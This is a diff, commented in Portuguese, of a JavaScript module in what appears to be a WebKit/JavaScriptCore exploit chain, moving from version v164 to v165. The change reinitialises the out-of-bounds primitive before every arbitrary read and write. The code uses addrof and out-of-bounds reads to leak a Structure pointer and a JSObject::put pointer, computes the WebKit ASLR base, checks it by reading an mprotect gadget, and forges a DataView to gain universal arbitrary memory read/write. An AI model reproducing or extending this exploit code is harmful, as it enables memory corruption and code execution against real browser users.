@@ -1,13 +1,12 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v164 - Estratégia: Vazamento ASLR Direto, Pular selfTestOOBReadWrite)
+// js/script3/testArrayBufferVictimCrash.mjs (v165 - Estratégia: Vazamento ASLR Direto, OOB Reinicializado por Operação)
 // =======================================================================================
 // ESTA VERSÃO FOCA EM:
-// 1. Pular o selfTestOOBReadWrite() para evitar possível instabilidade.
-// 2. Re-inicializar o ambiente OOB imediatamente antes do vazamento ASLR direto.
-// 3. Realizar uma validação OOB básica APÓS a re-inicialização.
-// 4. Usar 'addrof_core' e 'oob_read_absolute' para vazar o ponteiro da Structure de um objeto ArrayBuffer.
-// 5. Com o ponteiro da Structure, calcular a base ASLR da WebKit.
-// 6. Se o vazamento ASLR for bem-sucedido, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
-// 7. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
+// 1. RE-INICIALIZAR O AMBIENTE OOB (triggerOOB_primitive) NO INÍCIO DE CADA CHAMADA arb_read E arb_write.
+//    Isso tenta contornar o problema do 'm_vector' zerado garantindo um DataView fresco.
+// 2. Usar 'addrof_core' e 'oob_read_absolute' para vazar o ponteiro da Structure de um objeto ArrayBuffer.
+// 3. Com o ponteiro da Structure, calcular a base ASLR da WebKit.
+// 4. Se o vazamento ASLR for bem-sucedido, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
+// 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
 // =======================================================================================
 
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -18,9 +17,9 @@ import {
     addrof_core,
     fakeobj_core,
     initCoreAddrofFakeobjPrimitives,
-    arb_read,
-    arb_write,
-    selfTestOOBReadWrite, // Ainda importado, mas não será chamado
+    arb_read as core_arb_read, // Renomeado para evitar conflito com a nova arb_read wrapper
+    arb_write as core_arb_write, // Renomeado para evitar conflito com a nova arb_write wrapper
+    selfTestOOBReadWrite,
     oob_read_absolute,
     oob_write_absolute
 } from '../core_exploit.mjs'; // core_exploit.mjs deve estar na versão v31.13
@@ -28,7 +27,7 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // ATENÇÃO: Esta constante será atualizada a cada nova versão de teste
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_ASLR_ARBRW_v164_SKIP_SELFTEST";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_ASLR_ARBRW_v165_OOB_PER_OP";
 
 // Pausas ajustadas para estabilidade em ambientes com recursos limitados
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -41,6 +40,20 @@ let hold_objects = []; // Para evitar que o GC colete objetos críticos prematur
 
 // Variáveis para a primitiva universal ARB R/W (serão configuradas após o vazamento de ASLR)
 let _fake_data_view = null;
+
+
+// --- NOVAS FUNÇÕES WRAPPER para arb_read e arb_write ---
+// Estas funções garantirão que o ambiente OOB seja re-inicializado a cada chamada.
+async function arb_read(address, byteLength, logFn) {
+    await triggerOOB_primitive({ force_reinit: true });
+    return await core_arb_read(address, byteLength, logFn);
+}
+
+async function arb_write(address, value, byteLength, logFn) {
+    await triggerOOB_primitive({ force_reinit: true });
+    return await core_arb_write(address, value, byteLength, logFn);
+}
+// --- FIM DAS NOVAS FUNÇÕES WRAPPER ---
 
 
 // Funções Auxiliares Comuns (dumpMemory)
@@ -85,12 +98,7 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
     const fake_ab_backing_addr = addrof_core(_fake_data_view);
     const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
 
-    logFn(`[${FNAME}] DEBUG: _fake_data_view.buffer: ${String(_fake_data_view.buffer)}, .byteLength: ${String(_fake_data_view.byteLength)}`, "debug");
-    if (!_fake_data_view.buffer || _fake_data_view.byteLength === 0) {
-        logFn(`[${FNAME}] CRÍTICO: _fake_data_view detached/corrompido antes de read!`, "critical", FNAME);
-        throw new Error("_fake_data_view detached/corrompido.");
-    }
-
+    // Agora, as chamadas internas a arb_read e arb_write já farão a re-inicialização
     const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8, logFn);
     await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8, logFn);
 
@@ -122,12 +130,7 @@ export async function arb_write_universal_js_heap(address, value, byteLength, lo
     const fake_ab_backing_addr = addrof_core(_fake_data_view);
     const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
 
-    logFn(`[${FNAME}] DEBUG: _fake_data_view.buffer: ${String(_fake_data_view.buffer)}, .byteLength: ${String(_fake_data_view.byteLength)}`, "debug");
-    if (!_fake_data_view.buffer || _fake_data_view.byteLength === 0) {
-        logFn(`[${FNAME}] CRÍTICO: _fake_data_view detached/corrompido antes de write!`, "critical", FNAME);
-        throw new Error("_fake_data_view detached/corrompido.");
-    }
-
+    // Agora, as chamadas internas a arb_read e arb_write já farão a re-inicialização
     const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8, logFn);
     await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8, logFn);
 
@@ -182,6 +185,7 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
         const backing_ab_addr = addrof_core(backing_array_buffer);
         logFn(`[${FNAME}] ArrayBuffer de apoio real criado em: ${backing_ab_addr.toString(true)}`, "info", FNAME);
 
+        // Agora, as chamadas internas a arb_read e arb_write já farão a re-inicialização
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), dataViewStructureVtableAddress, 8, logFn);
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), AdvancedInt64.Zero, 8, logFn);
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START), 0xFFFFFFFF, 4, logFn);
@@ -323,11 +327,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const ab_addr = addrof_core(array_buffer_for_leak);
         logFn(`[ASLR LEAK] Endereço do ArrayBuffer alvo: ${ab_addr.toString(true)}`, "info");
 
-        // VALIDAÇÃO DA `arb_read` EM AÇÃO:
+        // VALIDAÇÃO DA `arb_read` EM AÇÃO (agora com wrapper que re-inicializa OOB)
         const m_length_offset = JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START;
         const m_length_addr = ab_addr.add(m_length_offset);
         logFn(`[ASLR LEAK] DEBUG: Verificando arb_read lendo m_length em ${m_length_addr.toString(true)}...`, "debug");
-        let m_length_leaked = await arb_read(m_length_addr, 4, logFn);
+        let m_length_leaked = await arb_read(m_length_addr, 4, logFn); // CHAMA A NOVA WRAPPER ARB_READ
         logFn(`[ASLR LEAK] DEBUG: Lido m_length do ArrayBuffer (${ab_addr.toString(true)} + ${toHex(m_length_offset)}): ${toHex(m_length_leaked)}`, "debug");
         if (m_length_leaked !== 0x100) {
             throw new Error(`DEBUG: M_length inesperado para ArrayBuffer alvo. Esperado: 0x100, Lido: ${toHex(m_length_leaked)}. A arb_read pode estar instável.`);
@@ -339,7 +343,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const structure_ptr_addr_in_ab = ab_addr.add(structure_ptr_offset);
         logFn(`[ASLR LEAK] Lendo o ponteiro da Structure no offset ${toHex(structure_ptr_offset)} de ArrayBuffer (${structure_ptr_addr_in_ab.toString(true)})...`, "info");
 
-        let structure_pointer_leaked = await arb_read(structure_ptr_addr_in_ab, 8, logFn);
+        let structure_pointer_leaked = await arb_read(structure_ptr_addr_in_ab, 8, logFn); // CHAMA A NOVA WRAPPER ARB_READ
 
         // Untag o ponteiro vazado (se necessário)
         const original_high_leaked_struct_ptr = structure_pointer_leaked.high();
@@ -357,7 +361,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const JSObject_put_ptr_address_in_heap = structure_pointer_leaked.add(JSObject_put_ptr_offset_in_structure);
         
         logFn(`[ASLR LEAK] Lendo ponteiro para JSObject::put da Structure vazada (${JSObject_put_ptr_address_in_heap.toString(true)})...`, "info");
-        const JSObject_put_leaked = await arb_read_universal_js_heap(JSObject_put_ptr_address_in_heap, 8, logFn);
+        const JSObject_put_leaked = await arb_read_universal_js_heap(JSObject_put_ptr_address_in_heap, 8, logFn); // CHAMA A NOVA WRAPPER ARB_READ UNIVERSAL
         logFn(`[ASLR LEAK] Ponteiro para JSObject::put vazado: ${JSObject_put_leaked.toString(true)}`, "leak");
 
         if (JSObject_put_leaked.equals(AdvancedInt64.Zero) || JSObject_put_leaked.equals(AdvancedInt64.NaNValue)) {
@@ -375,7 +379,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
         const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
         logFn(`[ASLR LEAK] Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
-        const mprotect_first_bytes_check = await arb_read_universal_js_heap(mprotect_addr_check, 4, logFn);
+        const mprotect_first_bytes_check = await arb_read_universal_js_heap(mprotect_addr_check, 4, logFn); // CHAMA A NOVA WRAPPER ARB_READ UNIVERSAL
         
         if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
             logFn(`[ASLR LEAK] LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
@@ -383,8 +387,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
              logFn(`[REAL LEAK] ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF.`, "error");
         }
 
-        // --- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---
-        logFn(`--- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---`, "subtest");
+        // --- FASE 3: Configurando a NOVA primitiva de L/E Arbitraria Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---
+        logFn(`--- FASE 3: Configurando a NOVA primitiva de L/E Arbitraria Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---`, "subtest");
 
         const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
         const DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE, 0));
@@ -417,7 +421,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             logFn(errorMsg, "critical");
             throw new Error(errorMsg);
         }
-        logFn("Primitiva de L/E Arbitrária Universal (arb_read_universal_js_heap / arb_write_universal_js_heap) CONFIGURADA com sucesso.", "good");
+        logFn("Primitiva de L/E Arbitraria Universal (arb_read_universal_js_heap / arb_write_universal_js_heap) CONFIGURADA com sucesso.", "good");
         await pauseFn(LOCAL_MEDIUM_PAUSE);
 
 
